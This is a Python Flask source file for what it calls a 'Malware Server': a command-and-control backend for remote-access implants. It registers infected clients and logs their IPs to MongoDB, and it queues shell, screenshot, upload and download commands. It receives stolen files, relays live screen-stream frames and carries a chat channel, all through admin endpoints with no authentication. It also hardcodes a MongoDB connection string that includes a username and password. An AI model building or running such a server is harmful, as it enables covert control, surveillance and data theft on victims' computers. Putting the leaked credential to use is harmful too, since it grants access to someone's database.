import os
import uuid
import time
import json
from datetime import datetime, timezone
from flask import Flask, request, jsonify, send_file, Response
from werkzeug.utils import secure_filename

# --- MongoDB Setup ---
try:
    from pymongo import MongoClient
    MONGO_URI = 'mongodb://jembex:qwerty4747@ac-pkxjbeh-shard-00-00.lyarq5l.mongodb.net:27017,ac-pkxjbeh-shard-00-01.lyarq5l.mongodb.net:27017,ac-pkxjbeh-shard-00-02.lyarq5l.mongodb.net:27017/myclients?ssl=true&replicaSet=atlas-l0l26j-shard-0&authSource=admin&retryWrites=true&w=majority&appName=datas'
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    # Trigger connection to verify it works
    mongo_client.server_info()
    db = mongo_client['myclients']
    clients_collection = db['clients']
    MONGO_ENABLED = True
    print("[+] MongoDB connected successfully.")
except Exception as _mongo_err:
    MONGO_ENABLED = False
    clients_collection = None
    print(f"[-] MongoDB connection failed: {_mongo_err}. Falling back to JSON log only.")

app = Flask(__name__)

# Enable CORS to allow the web dashboard to communicate with the server
# Including 'null' origin to support opening dashboard as a local file
try:
    from flask_cors import CORS
    CORS(app, origins=["*"], supports_credentials=True)
except ImportError:
    print("Warning: flask_cors not installed. Web dashboard might fail to connect.")

import threading

# ... (Global State)
# clients = { ... }
clients = {}
clients_lock = threading.RLock()

# Folder to store uploaded files
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Streaming state
streaming_clients = {}  # {client_id: {"active": True, "last_frame": None, "frame_time": 0}}

# Chunked uploads state
chunked_uploads = {}  # {"client_id:cmd_id": {"chunks": {}, "total_chunks": N, "filename": "...", "timestamp": T}}

# Folder for temporary chunks
CHUNKS_FOLDER = 'chunks_temp'
if not os.path.exists(CHUNKS_FOLDER):
    os.makedirs(CHUNKS_FOLDER)

# Folder for user logs
USER_LOG_DIR = 'user'
USER_LOG_FILE = os.path.join(USER_LOG_DIR, 'saves.json')
if not os.path.exists(USER_LOG_DIR):
    os.makedirs(USER_LOG_DIR)

# --- Helpers ---   

def log_user_registration(client_id, ip):
    """Log user registration to MongoDB and a local JSON file"""
    # Timestamp when the user joined
    joined_at = datetime.now(timezone.utc)
    joined_at_iso = joined_at.isoformat()

    # --- Save to MongoDB ---
    if MONGO_ENABLED and clients_collection is not None:
        try:
            # Upsert: insert if new client, skip if already exists
            result = clients_collection.update_one(
                {"client_id": client_id},
                {
                    "$setOnInsert": {
                        "client_id": client_id,
                        "ip": ip,
                        "joined_at": joined_at,           # datetime object (UTC)
                        "joined_at_iso": joined_at_iso    # human-readable ISO string
                    }
                },
                upsert=True
            )
            if result.upserted_id:
                print(f"[+] MongoDB: New client {client_id} saved (joined at {joined_at_iso})")
            else:
                print(f"[~] MongoDB: Client {client_id} already exists, join time preserved.")
        except Exception as e:
            print(f"[-] MongoDB write error: {e}")

    # --- Save to local JSON (fallback / backup) ---
    try:
        log_data = []
        if os.path.exists(USER_LOG_FILE):
            with open(USER_LOG_FILE, 'r') as f:
                try:
                    log_data = json.load(f)
                except (json.JSONDecodeError, FileNotFoundError):
                    log_data = []
        
        log_data.append({
            "client_id": client_id,
            "ip": ip,
            "joined_at": joined_at_iso
        })
        
        with open(USER_LOG_FILE, 'w') as f:
            json.dump(log_data, f, indent=4)
        print(f"[#] Logged user {client_id} to {USER_LOG_FILE}")
    except Exception as e:
        print(f"[-] Error saving to json: {e}")

def clean_clients():
    """Remove dead clients (inactive > 60s)"""
    with clients_lock:
        now = time.time()
        dead = []
        for cid, data in clients.items():
            if now - data['last_seen'] > 60:
                dead.append(cid)
        for d in dead:
            del clients[d]
            # Also clean up streaming state for dead clients
            if d in streaming_clients:
                del streaming_clients[d]

# --- Client API Endpoints ---

@app.route('/api/register', methods=['POST'])
def register():
    """Client first check-in"""
    ip = request.remote_addr
    # Try to keep same ID if provided, else new
    data = request.json or {}
    client_id = data.get('id')
    public_ip = data.get('public_ip', ip)  # Use client-provided public IP or fallback to remote_addr
    
    # Trust the client's ID if provided, otherwise generate new
    if not client_id:
        client_id = str(uuid.uuid4())[:8]
    
    # Initialize if new or update if existing
    with clients_lock:
        if client_id not in clients:
            clients[client_id] = {
                "ip": public_ip,
                "last_seen": time.time(),
                "command_queue": [],
                "results": {},
                "streaming": False
            }
        else:
            # Update existing client (keep queue and results)
            clients[client_id]['ip'] = public_ip
            clients[client_id]['last_seen'] = time.time()
    
    print(f"[+] Client registered: {client_id} from {public_ip}")
    log_user_registration(client_id, public_ip)
    return jsonify({"id": client_id, "status": "registered"})

@app.route('/api/poll', methods=['POST'])
def poll():
    """Client checks for commands"""
    data = request.json or {}
    client_id = data.get('id')
    
    with clients_lock:
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client, re-register"}), 404
            
        # Update heartbeat
        clients[client_id]['last_seen'] = time.time()
        
        # Check queue
        queue = clients[client_id]['command_queue']
        if queue:
            # Pop one command
            cmd = queue.pop(0)
            return jsonify({"command": cmd})
    
    return jsonify({"command": None})

@app.route('/api/result', methods=['POST'])
def result():
    """Client sends result of a command"""
    data = request.json or {}
    client_id = data.get('id')
    cmd_id = data.get('cmd_id')
    output = data.get('output')
    
    with clients_lock:
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client"}), 404
            
        if cmd_id:
            clients[client_id]['results'][cmd_id] = output
            print(f"[*] Result received for {cmd_id} from {client_id}")
        
    return jsonify({"status": "ok"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Client uploads a file (screenshot or downloaded file)"""
    try:
        client_id = request.form.get('id')
        cmd_id = request.form.get('cmd_id')
        is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'
        print(f"DEBUG: /api/upload client_id={client_id}")
        
        with clients_lock:
            if client_id != 'ADMIN' and (not client_id or client_id not in clients):
                print(f"DEBUG: Unknown client rejection. ID: {client_id}")
                return jsonify({"error": "Unknown client"}), 404
        
        if 'file' not in request.files:
            return jsonify({"error": "No file part"}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No selected file"}), 400
        
        # For streaming frames, store directly in memory
        if is_stream_frame:
            file_data = file.read()
            with clients_lock:
                if client_id not in streaming_clients:
                    streaming_clients[client_id] = {}
                streaming_clients[client_id]['last_frame'] = file_data
                streaming_clients[client_id]['frame_time'] = time.time()
            return jsonify({"status": "frame_received"})
        
        # Save file for regular uploads
        filename = secure_filename(f"{client_id}_{int(time.time())}_{file.filename}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Store the filename/path as the result for the admin to retrieve later
        if cmd_id:
            with clients_lock:
                if client_id in clients:
                    clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
            
        return jsonify({"status": "uploaded", "filename": filename})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# --- Chat Endpoints ---

@app.route('/api/chat/send', methods=['POST'])
def chat_send():
    """Receive chat message from Client or Admin"""
    data = request.json or {}
    client_id = data.get('id') or data.get('target_id') # Client uses 'id', Admin uses 'target_id'
    sender = data.get('sender') # 'client' or 'admin'
    message = data.get('message')
    
    with clients_lock:
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client"}), 404
            
        msg_obj = {
            "sender": sender,
            "message": message,
            "timestamp": time.time()
        }
        
        # Init chat history if needed
        if 'chat' not in clients[client_id]:
            clients[client_id]['chat'] = []
            
        clients[client_id]['chat'].append(msg_obj)
        
        # If sent by Admin, allow Client to pick it up via command? 
        # Or better: Client polls specifically for chat if chat is open?
        # For now, let's keep it simple: Admin queues a 'chat_msg' command for immediate push
        if sender == 'admin':
            cmd_id = str(uuid.uuid4())[:8]
            clients[client_id]['command_queue'].append({
                "id": cmd_id,
                "type": "chat_msg",
                "params": message
            })
        
    return jsonify({"status": "sent"})

@app.route('/api/chat/history/<client_id>', methods=['GET'])
def chat_history(client_id):
    """Get chat history"""
    with clients_lock:
        if client_id in clients:
            return jsonify(clients[client_id].get('chat', []))
    return jsonify([])

# --- Admin API Endpoints ---

@app.route('/admin/list', methods=['GET'])
def admin_list():
    """List active clients"""
    clean_clients()
    active = []
    with clients_lock:
        for cid, data in clients.items():
            active.append({
                "id": cid,
                "ip": data['ip'],
                "last_seen": int(time.time() - data['last_seen'])
            })
    return jsonify(active)

@app.route('/admin/command', methods=['POST'])
def admin_command():
    """Admin schedules a command"""
    data = request.json or {}
    target_id = data.get('target_id')
    cmd_type = data.get('type') # 'shell', 'screen', 'upload', 'download'
    cmd_params = data.get('params', "")
    
    with clients_lock:
        if not target_id or target_id not in clients:
            return jsonify({"error": "Client not found"}), 404
            
        cmd_id = str(uuid.uuid4())[:8]
        command = {
            "id": cmd_id,
            "type": cmd_type,
            "params": cmd_params
        }
        
        # Handle streaming commands
        if cmd_type == 'start_stream':
            clients[target_id]['streaming'] = True
            if target_id not in streaming_clients:
                streaming_clients[target_id] = {}
        elif cmd_type == 'stop_stream':
            clients[target_id]['streaming'] = False
            if target_id in streaming_clients:
                del streaming_clients[target_id]
        
        clients[target_id]['command_queue'].append(command)
    return jsonify({"cmd_id": cmd_id, "status": "queued"})

@app.route('/admin/response/<cmd_id>', methods=['GET'])
def admin_response(cmd_id):
    """Admin polls for result of specific command"""
    # Search all clients for this cmd_id result
    # Inefficient for many clients, but fine for small scale
    with clients_lock:
        for cid, data in clients.items():
            if cmd_id in data['results']:
                res = data['results'].pop(cmd_id) # Consume result
                return jsonify({"status": "done", "output": res})
            
    return jsonify({"status": "pending"})

@app.route('/admin/download_file/<filename>', methods=['GET'])
def admin_download(filename):
    """Serve file for download (admin or client)"""
    try:
        safe_filename = secure_filename(filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
        
        if not os.path.exists(filepath):
            print(f"[-] File not found: {filepath}")
            return jsonify({
                "error": "File not found",
                "filename": safe_filename,
                "path": filepath
            }), 404
        
        file_size = os.path.getsize(filepath)
        print(f"[*] Serving file: {safe_filename} ({file_size} bytes)")
        
        # Use send_file with proper parameters for large file support
        return send_file(
            filepath,
            as_attachment=True,
            download_name=os.path.basename(safe_filename),
            mimetype='application/octet-stream'
        )
    except Exception as e:
        print(f"[-] Error serving file {filename}: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/admin/stream_frame/<client_id>', methods=['GET'])
def admin_stream_frame(client_id):
    """Admin gets latest stream frame from client"""
    with clients_lock:
        if client_id in streaming_clients:
            frame_data = streaming_clients[client_id].get('last_frame')
            if frame_data:
                return Response(frame_data, mimetype='image/jpeg')
    return jsonify({"error": "No frame available"}), 404

@app.route('/admin/stream_status/<client_id>', methods=['GET'])
def admin_stream_status(client_id):
    """Check if client is streaming"""
    with clients_lock:
        if client_id in clients:
            return jsonify({"streaming": clients[client_id].get('streaming', False)})
    return jsonify({"streaming": False})

@app.route('/')
def index():
    return "Malware Server Running. Use Admin Client."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
